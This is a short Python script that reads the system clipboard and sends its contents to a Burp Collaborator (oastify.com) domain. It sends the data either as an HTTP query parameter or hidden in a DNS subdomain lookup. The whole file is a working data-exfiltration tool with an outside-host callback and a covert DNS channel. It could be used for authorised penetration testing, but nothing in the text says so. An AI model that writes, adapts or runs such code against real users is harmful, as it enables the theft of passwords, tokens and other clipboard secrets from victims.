import pyperclip
import requests
import socket

# === Config ===
BURP_COLLABORATOR_DOMAIN = "rc77j10gfhi8achyl51ogqepngtah05p.oastify.com"  # replace with your
USE_HTTP = True  # Set to False to use DNS

def send_via_http(data):
    try:
        url = f"http://{BURP_COLLABORATOR_DOMAIN}/?q={data}"
        response = requests.get(url, timeout=5)
        print(f"[+] Sent via HTTP, status: {response.status_code}")
    except Exception as e:
        print(f"[!] HTTP request failed: {e}")

def send_via_dns(data):
    try:
        # Sanitize: replace spaces with hyphens to make it valid as a subdomain
        safe_data = data.replace(" ", "-")
        subdomain = f"{safe_data}.{BURP_COLLABORATOR_DOMAIN}"
        # Perform DNS lookup
        socket.gethostbyname(subdomain)
        print("[+] Sent via DNS lookup")
    except Exception as e:
        print(f"[!] DNS lookup failed: {e}")

def main():
    clipboard_data = pyperclip.paste()
    if not clipboard_data:
        print("[!] Clipboard is empty.")
        return

    print(f"[+] Clipboard data: {clipboard_data}")

    if USE_HTTP:
        send_via_http(clipboard_data)
    else:
        send_via_dns(clipboard_data)

if __name__ == "__main__":
    main()
